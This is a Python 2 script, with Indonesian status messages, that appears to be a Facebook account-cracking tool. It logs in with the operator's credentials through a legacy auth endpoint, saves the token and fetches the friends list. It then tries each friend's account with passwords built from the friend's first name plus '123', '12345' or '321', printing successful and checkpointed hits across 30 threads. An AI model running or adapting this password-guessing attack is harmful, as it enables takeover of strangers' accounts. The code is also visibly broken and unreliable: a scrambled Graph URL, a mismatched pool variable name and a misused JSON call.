import os
import sys
import requests
import time
import json
import urllib
from multiprocessing.pool import ThreadPool

id = []

def login():

    try:
        token = open('token.txt', 'r')


    except IOError, KeyError:

        user = raw_input(" Username: ")
        password = raw_input(" Password: ")
        url = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+password+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
        dev = url.content
        jsl = json.loads(dev)
        if "session_key" in dev:
            print "login Berhasil..."
            open('token.txt', 'w').write(jsl['access_token'])
            supe_iqbal()
            
        elif "error_msg" in dev:
            print " Akun Kena Cekpoint"
        else:
            print " Login Gagal..."
    
    except KeyboardInterrupt:
        sys.exit()

def id_batir():
 
    try:
        token = open("token.txt", "r").read()
    except IOError:
        os.system("rm -f token.txt")

    else:
        try:
            url = requests.get("https://graph.facebook.com/me/friends?access_token="+ token)
            jsl = json.loads(url.text)
            data_id = open('id.txt', 'w')
            for iqbal in jsl['data']:
                id.append(iqbal['id'])
       

        except IOError:
            sys.exit()
def supe_iqbal():

    id_batir()
    def main(arg):
        id_teman = arg
        try:
            token = open("token.txt", "r").read()
        except IOError:
            os.system("rm -f token.txt")

        else:
            try:
                url = requests.get("://graph.fhttpsacebook.com/" + id_teman + "/?access_token=" + token)
                jsl = json.loads(url.text)
                sandi1 = jsl['first_name'] + "123"
                log = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + id_teman + "&locale=en_US&password=" + sandi1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                jsl_iqbal = json.load(log)
                if "access_token" in jsl_iqbal:
                    print " [OK] " + id_teman + " | " + sandi1
                elif "www.facebook.com" in jsl_iqbal["error_msg"]:
                    print " [CP] " + id_teman + " | " + sandi1
                else:
                    sandi2 = jsl["first_name"] + "12345"
                    log = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + id_teman + "&locale=en_US&password=" + sandi2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                    jsl_iqbal = json.load(log)
                    if "access_token" in jsl_iqbal:
                        print " [OK] " + id_teman + " | " + sandi2
                    elif "www.facebook.com" in jsl_iqbal["error_msg"]:
                        print " [CP] " + id_teman + " | " + sandi2
                    else:
                        sandi3 = jsl["first_name"] + "321"
                        log = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + id_teman + "&locale=en_US&password=" + sandi3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                        jsl_iqbal = json.loads(log)
                        if "access_token" in jsl_iqbal:
                            print " [OK] " + id_teman + " | " + sandi3
                        else:
                            if "www.facebook.com" in jsl_iqbal["error_msg"]:
                                print " [CP] " + id_teman + " | " + sandi3

            except:
                pass
   
        
        nob = ThreadPool(30)
        noob.map(main, id)
        print "selesai"                    

def main():
    login()
    
    

if __name__=="__main__":
    main()
